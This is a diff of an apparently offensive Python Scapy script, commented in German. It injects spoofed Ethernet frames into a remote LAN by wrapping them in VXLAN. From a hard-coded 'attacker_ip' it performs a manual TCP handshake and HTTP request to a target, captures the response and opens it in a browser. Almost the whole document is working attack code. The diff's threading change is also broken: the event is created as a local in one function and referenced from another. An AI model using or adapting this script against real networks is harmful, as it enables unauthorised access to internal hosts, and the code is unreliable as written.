@@ -28,14 +28,14 @@ mac_src = "be:fb:ef:be:fb:ef"
 mac_dst = "ea:e4:59:b5:42:03" #"ff:ff:ff:ff:ff:ff"
 attacker_ip = "172.20.10.10"
 http_port = int(sys.argv[2])
-dest = sys.argv[1]
+destination_ip = sys.argv[1]
 s_port = random.randint(20000,65500)
 
 CONNECTION = {"connected": False}
 CONNECTION_FINISHED = False
+
 http_content = ""
 threads = []
-
 
 # TCP-Flags definieren
 FIN = 0x01
@@ -56,12 +56,12 @@ else:
 ### VXLAN Paket: Hierueber werden Ethernet Frames ins LAN eingefuert
 VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)
 ### getStr ist der String im HTTP Request
-getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
+getStr = 'GET / HTTP/1.1\r\nHost:' + destination_ip + '\r\nAccept-Encoding: 8bit\r\n\r\n'
 
 
 
 def sniff_all_packets():
-    sniff(session=TCPSession, filter = "tcp src port " + str(http_port), prn=packet_received, store=False, count = 5)
+    sniff(session=TCPSession, filter = "tcp src port " + str(http_port), prn=packet_received, store=False, stop_filter= lambda x: CONNECTION_FINISHED)
     return
 
 def packet_received(packet):
@@ -88,45 +88,6 @@ def packet_received(packet):
         global http_content
         ### http content sind header und body und wird ggf aus mehreren Paketen zusammengesetzt. Nur die Layer Raw besitzt Teile von HTTP Content
         http_content += str(packet.getlayer(Raw).load)
-
-def send_tcp(src_port, seqnr, acknr, tcp_flags):
-    ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags=tcp_flags)
-    out_ack = send(ack, verbose=0)
-    return
-
-def syn_ack_received_send_http_req(src_port, seqnr, acknr):
-    http_request = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags='P''A') / getStr
-    send(http_request, verbose=0)
-    if debug:
-        print("############## HTTP Request sent #####################")
-        print("srcport = " + str(src_port)) 
-        print("ACK# = " + str(acknr))
-        print("SEQ# = " + str(seqnr))
-        print("")
-
-def send_request():
-    while CONNECTION["connected"] is not True:
-        time.sleep(0.01)
-    syn_ack_received_send_http_req(CONNECTION["dst_port"], CONNECTION["seq_nr"], CONNECTION["ack_nr"])
-
-def fin_function():
-    ### Wait until FIN packet is received
-    while CONNECTION_FINISHED is not True:
-        time.sleep(0.2)
-
-    ### Connection is Finished --> FIN Packet Received
-    print(http_status)
-    print("")
-    print(http_content)
-        ### Oeffne Google Chrome mit der Website
-    http_body = http_content.partition("\r\n\r\n")[2]
-    f = open("website.html", "w")
-    f.write(http_body)
-    f.close()
-    new = 2
-    url = "/home/ben/http_request/website.html"
-    os.system('sudo -u ben google-chrome-stable /home/ben/http_request/website.html')
-    return
 
 def TCP_connection_manager(packet, payload_length, flags, in_seq, in_ack, dst_port):
     if debug:
@@ -173,14 +134,49 @@ def TCP_connection_manager(packet, payload_length, flags, in_seq, in_ack, dst_po
             print ("FIN/ACK wird geschickt mit ACK#=" + str(ack_nr) + " und SEQ#=" + str(seq_nr))
         send_tcp(dst_port, seq_nr, ack_nr, send_flags)
         CONNECTION_FINISHED = True
+        connection_finished_event.set()
     if debug:
         print ("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n\r\n\r\n")
     return
 
+def send_tcp(src_port, seqnr, acknr, tcp_flags):
+    ack = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags=tcp_flags)
+    out_ack = send(ack, verbose=0)
+    return
 
+def send_request():
+    while CONNECTION["connected"] is not True:
+        time.sleep(0.01)
+    syn_ack_received_send_http_req(CONNECTION["dst_port"], CONNECTION["seq_nr"], CONNECTION["ack_nr"])
 
+def syn_ack_received_send_http_req(src_port, seqnr, acknr):
+    http_request = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags='P''A') / getStr
+    send(http_request, verbose=0)
+    if debug:
+        print("############## HTTP Request sent #####################")
+        print("srcport = " + str(src_port)) 
+        print("ACK# = " + str(acknr))
+        print("SEQ# = " + str(seqnr))
+        print("")
 
-
+def fin_function():
+    ### Wait until FIN packet is received
+    #while CONNECTION_FINISHED is not True:
+    #    time.sleep(0.2)
+    connection_finished_event = threading.Event()
+    ### Connection is Finished --> FIN Packet Received
+    print(http_status)
+    print("")
+    print(http_content)
+        ### Oeffne Google Chrome mit der Website
+    http_body = http_content.partition("\r\n\r\n")[2]
+    f = open("website.html", "w")
+    f.write(http_body)
+    f.close()
+    new = 2
+    url = "/home/ben/http_request/website.html"
+    os.system('sudo -u ben google-chrome-stable /home/ben/http_request/website.html')
+    return
 
 
 
@@ -197,13 +193,13 @@ time.sleep(1)
 
 
 #$$$$$ SEND SYN
-syn = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(sport=s_port, dport=http_port, flags='S')
+syn = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(sport=s_port, dport=http_port, flags='S')
 send(syn, verbose=0)
 if debug:
         print("############## SYN packet sent #####################")
         print("dport von SYN = " + str(http_port))
         print("Source IP Address = " + str(attacker_ip))
-        print("Destination IP Address = " + str(dest))
+        print("Destination IP Address = " + str(destination_ip))
         print("")
 
 
